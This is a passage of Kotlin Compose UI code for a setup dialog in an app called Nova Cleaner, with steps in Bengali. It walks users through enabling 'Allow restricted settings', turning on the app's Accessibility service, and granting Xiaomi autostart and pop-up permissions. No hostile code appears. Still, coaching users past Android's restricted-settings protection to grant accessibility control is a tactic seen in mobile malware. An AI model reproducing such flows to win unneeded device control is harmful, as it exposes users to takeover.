                    desc = "\"Allow restricted settings\" সিলেক্ট করে ফোনের ফিঙ্গারপ্রিন্ট বা প্যাটার্ন আনলক দিন।"
                )
                GuideStepItem(
                    step = "৪",
                    title = "Accessibility অন করে দিন",
                    desc = "এবার '2. OPEN ACCESSIBILITY' বাটনে গিয়ে Nova Cleaner সিলেক্ট করে অন করুন।"
                )

                Spacer(modifier = Modifier.height(6.dp))

                // Shortcut Buttons
                Button(
                    onClick = {
                        val launched = AppAccessibilityService.openAppDetailsSettings(context)
                        if (!launched) {
                            Toast.makeText(context, "Could not open App Info automatically", Toast.LENGTH_SHORT).show()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF59E0B)),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Icon(
                        imageVector = Icons.Default.SettingsApplications,
                        contentDescription = null,
                        tint = Color.Black,
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "1. OPEN APP INFO (৩-ডট মেনু)",
                        color = Color.Black,
                        fontWeight = FontWeight.Bold,
                        fontSize = 11.sp
                    )
                }

                Button(
                    onClick = {
                        val launched = AppAccessibilityService.openAccessibilitySettings(context)
                        if (!launched) {
                            Toast.makeText(context, "Could not open Accessibility automatically", Toast.LENGTH_SHORT).show()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = NeonCyan),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Icon(
                        imageVector = Icons.Default.Accessibility,
                        contentDescription = null,
                        tint = Color.Black,
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "2. OPEN ACCESSIBILITY",
                        color = Color.Black,
                        fontWeight = FontWeight.Bold,
                        fontSize = 11.sp
                    )
                }

                OutlinedButton(
                    onClick = {
                        AppAccessibilityService.openXiaomiOtherPermissions(context)
                    },
                    border = BorderStroke(1.dp, NeonPurple),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(
                        text = "3. XIAOMI AUTOSTART & POP-UP",
                        color = NeonPurple,
                        fontWeight = FontWeight.SemiBold,
                        fontSize = 10.sp
                    )
                }
            }
        },
        confirmButton = {
            TextButton(onClick = onDismiss) {
                Text("DONE", color = NeonGreen, fontWeight = FontWeight.Bold)
            }
        },
        containerColor = Color(0xFF1E293B)
    )
}

@Composable
fun GuideStepItem(
    step: String,
    title: String,
    desc: String
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .clip(RoundedCornerShape(8.dp))
            .background(Color(0x0DFFFFFF))
            .padding(8.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Box(
            modifier = Modifier
                .size(24.dp)
                .clip(CircleShape)
                .background(Color(0x2200F2FE))
                .border(1.dp, NeonCyan, CircleShape),
            contentAlignment = Alignment.Center
        ) {
            Text(
                text = step,
                color = NeonCyan,
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold
            )
        }
        Spacer(modifier = Modifier.width(8.dp))
        Column {
            Text(
                text = title,
                color = Color.White,
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold
            )
            Text(
                text = desc,
                color = Color(0xFFCBD5E1),
                fontSize = 10.sp,
                lineHeight = 13.sp
            )
        }
    }
}

